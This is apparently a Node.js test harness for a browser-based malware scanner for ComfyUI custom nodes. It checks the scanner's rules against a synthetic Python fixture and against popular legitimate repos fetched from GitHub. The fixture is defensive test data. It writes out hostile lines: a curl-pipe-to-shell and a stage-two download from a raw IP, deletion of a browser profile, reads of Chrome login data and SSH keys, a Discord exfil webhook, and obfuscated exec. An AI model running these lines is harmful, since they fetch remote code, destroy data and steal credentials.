// Verifies the scanner against:
//   (1) a synthetic file that bundles the documented attack patterns —
//       expect *every* critical rule to fire
//   (2) several popular legitimate ComfyUI custom-node repos —
//       expect low/info findings, no criticals from genuine non-malicious use
//
// We re-implement the rule loop here in Node, mirroring index.html's logic,
// so the same RULES table is the source of truth. The actual scanner code is
// extracted from index.html via a small loader so we don't have two copies.

"use strict";
const fs = require("fs");
const path = require("path");
const https = require("https");

// Load index.html, extract the RULES array + scanFile / helpers via eval in a
// minimal global context. Not pretty, but it keeps the rule definitions
// authoritative in the page itself.
const html = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const scriptMatch = html.match(/<script>\s*"use strict";([\s\S]*?)<\/script>/);
if (!scriptMatch) throw new Error("couldn't find <script> in index.html");

// Strip browser-only bottom half (DOM wiring). We need everything up to and
// including scanFile; everything after the rule/scan defs touches the DOM.
const fullJs = scriptMatch[1];
const cutAt = fullJs.indexOf("// Renderer");
const scannerJs = cutAt > 0 ? fullJs.slice(0, cutAt) : fullJs;
// eslint-disable-next-line no-new-func
const ctx = {};
new Function("module", "exports", "globalThis", scannerJs + "\nmodule.exports = { RULES, scanFile, stripStringsAndComments };")(
  ctx, ctx, ctx
);
const { RULES, scanFile } = ctx.exports;
console.log(`Loaded ${RULES.length} rules from index.html\n`);

// --- (1) synthetic dangerous-pattern fixture -------------------------------
const synthetic = `
# Synthetic test fixture. NOT real malware — exercise patterns the scanner
# should detect at the highest severities.

import os, sys, subprocess, base64, pickle, marshal, ctypes, importlib

def stealer():
    # Browser-profile exfil
    chrome = os.path.expanduser("~/Library/Application Support/Google/Chrome/User Data/Default/Login Data")
    ssh = os.path.expanduser("~/.ssh/id_rsa")

    # Discord webhook for exfil
    webhook = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ-1234"

    # Crypto wallet (zero-filled ETH-shape address, illustrative)
    btc = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
    eth = "0x0000000000000000000000000000000000000000"

    # Shell command + curl|sh drive-by
    os.system("curl http://198.51.100.42/payload.sh | sh")
    subprocess.run("rm -rf " + chrome, shell=True)

    # Obfuscated exec
    exec(base64.b64decode("cHJpbnQoJ2hpJyk="))
    eval(chr(112) + chr(114) + chr(105))

    # pickle + marshal
    pickle.loads(open("data", "rb").read())
    marshal.loads(b"\\x00")

    # native DLL
    lib = ctypes.CDLL("evil.so")

    # importlib with variable
    mod_name = "stealer"
    importlib.import_module(mod_name)

    # runtime pip
    subprocess.run(["pip", "install", "evil-package"])

    # raw IP URL + pastebin
    import urllib.request
    urllib.request.urlopen("http://198.51.100.42/stage2.py")
    urllib.request.urlopen("https://pastebin.com/raw/abc123")
`;

console.log("=== (1) Synthetic attack-pattern fixture ===");
const synthFindings = scanFile("synthetic_attack.py", synthetic);
const synthCount = synthFindings.reduce((acc, f) => { acc[f.severity] = (acc[f.severity] || 0) + 1; return acc; }, {});
console.log("  Counts by severity:", synthCount);
const expectedRules = [
  "exec-base64", "exec-chr-assembly", "pickle-loads", "marshal-loads",
  "browser-profile-exfil", "ssh-key-exfil", "discord-webhook",
  "crypto-wallet-address", "exec-eval-direct", "os-system",
  "subprocess-shell-true", "ctypes-dll", "importlib-variable",
  "pip-runtime", "raw-ip-url", "pastebin-url", "urllib-urlopen"
];
const firedRules = new Set(synthFindings.map((f) => f.ruleId));
const missing = expectedRules.filter((r) => !firedRules.has(r));
if (missing.length) console.log("  MISSING expected rules:", missing);
else console.log("  All expected rules fired ✓");

// --- (2) real ComfyUI custom-node repos via raw.githubusercontent.com ------
function fetchText(url) {
  return new Promise((resolve, reject) => {
    https.get(url, { headers: { "User-Agent": "node-safety-verify" } }, (res) => {
      if (res.statusCode === 302 || res.statusCode === 301) {
        fetchText(res.headers.location).then(resolve, reject);
        return;
      }
      if (res.statusCode !== 200) { resolve(null); return; }
      let body = "";
      res.on("data", (c) => body += c);
      res.on("end", () => resolve(body));
    }).on("error", reject);
  });
}

async function fetchGithubTree(owner, repo, branch) {
  const meta = await fetchText(`https://api.github.com/repos/${owner}/${repo}`);
  if (!meta) return null;
  const m = JSON.parse(meta);
  const useBranch = branch || m.default_branch;
  const tree = await fetchText(`https://api.github.com/repos/${owner}/${repo}/git/trees/${useBranch}?recursive=1`);
  if (!tree) return null;
  return { branch: useBranch, files: JSON.parse(tree).tree || [] };
}

function isRelevantPath(p) {
  return /\.py$/i.test(p) ||
    /(^|\/)(setup\.cfg|setup\.py|pyproject\.toml)$/i.test(p) ||
    /(^|\/)requirements[^\/]*\.txt$/i.test(p);
}

async function scanRepo(label, owner, repo, branch) {
  const tree = await fetchGithubTree(owner, repo, branch);
  if (!tree) { console.log(`  [${label}] failed to fetch`); return null; }
  const relevant = tree.files.filter((n) => n.type === "blob" && isRelevantPath(n.path));
  if (!relevant.length) { console.log(`  [${label}] no Python files`); return null; }
  // Cap to first 50 files to keep verification fast.
  const slice = relevant.slice(0, 50);
  let findings = [], totalLines = 0;
  for (const n of slice) {
    const src = await fetchText(`https://raw.githubusercontent.com/${owner}/${repo}/${tree.branch}/${n.path}`);
    if (!src) continue;
    totalLines += (src.match(/\n/g) || []).length + 1;
    findings.push(...scanFile(n.path, src));
  }
  const counts = findings.reduce((acc, f) => { acc[f.severity] = (acc[f.severity] || 0) + 1; return acc; }, { crit: 0, high: 0, warn: 0, info: 0 });
  console.log(`  [${label}] ${owner}/${repo}@${tree.branch}: ${slice.length}/${relevant.length} files, ${totalLines} lines`);
  console.log(`             crit=${counts.crit}  high=${counts.high}  warn=${counts.warn}  info=${counts.info}`);
  // List any criticals so I can manually verify they're false-positive vs real
  const crits = findings.filter((f) => f.severity === "crit");
  if (crits.length) {
    console.log(`             critical findings:`);
    for (const c of crits.slice(0, 8)) {
      console.log(`               - ${c.ruleId} :: ${c.filename}:${c.line} :: ${c.excerpt.slice(0, 90)}`);
    }
  }
  // Sample a few high findings to verify they're real signal, not false positives.
  const highs = findings.filter((f) => f.severity === "high");
  if (highs.length) {
    console.log(`             sample high findings (first 3):`);
    for (const h of highs.slice(0, 3)) {
      console.log(`               - ${h.ruleId} :: ${h.filename}:${h.line} :: ${h.excerpt.slice(0, 90)}`);
    }
  }
  return { counts, findings };
}

(async () => {
  console.log("\n=== (2) Legitimate popular ComfyUI custom-node repos ===");
  // Pulled from the ComfyUI-Manager registry of popular nodes; all
  // well-known maintainers. Critical findings here would indicate
  // a false-positive in the scanner.
  const repos = [
    ["ComfyUI-Manager",       "Comfy-Org",                    "ComfyUI-Manager",                      null],
    ["VideoHelperSuite",      "Kosinkadink",                  "ComfyUI-VideoHelperSuite",             null],
    ["AnimateDiff-Evolved",   "Kosinkadink",                  "ComfyUI-AnimateDiff-Evolved",          null],
    ["Advanced-ControlNet",   "Kosinkadink",                  "ComfyUI-Advanced-ControlNet",          null],
    ["ComfyUI-GGUF",          "city96",                       "ComfyUI-GGUF",                         null],
    ["ComfyUI-MultiGPU",      "pollockjj",                    "ComfyUI-MultiGPU",                     null],
    ["ComfyUI-Florence2",     "kijai",                        "ComfyUI-Florence2",                    null]
  ];
  for (const [label, owner, repo, branch] of repos) {
    await scanRepo(label, owner, repo, branch);
  }
})();
